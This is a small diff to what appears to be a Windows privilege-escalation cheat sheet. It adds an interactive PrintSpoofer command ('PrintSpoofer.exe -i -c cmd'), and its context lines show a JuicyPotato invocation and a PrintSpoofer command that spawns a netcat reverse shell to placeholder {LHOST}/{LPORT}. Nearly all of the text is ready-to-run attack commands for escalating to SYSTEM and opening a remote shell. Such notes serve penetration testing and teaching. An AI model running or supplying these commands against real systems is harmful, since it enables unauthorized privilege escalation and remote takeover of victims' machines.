@@ -1054,6 +1054,7 @@ cmd /c "JuicyPotato.exe -t * -p run.exe -l 8003 -c {CLSID}"
 
 # Print Spoofer for Impersonation
 # Compatible for Windows 10 and Server 2016/2019.
+PrintSpoofer.exe -i -c cmd
 PrintSpoofer.exe -c "nc.exe {LHOST} {LPORT} -e cmd"
 
 
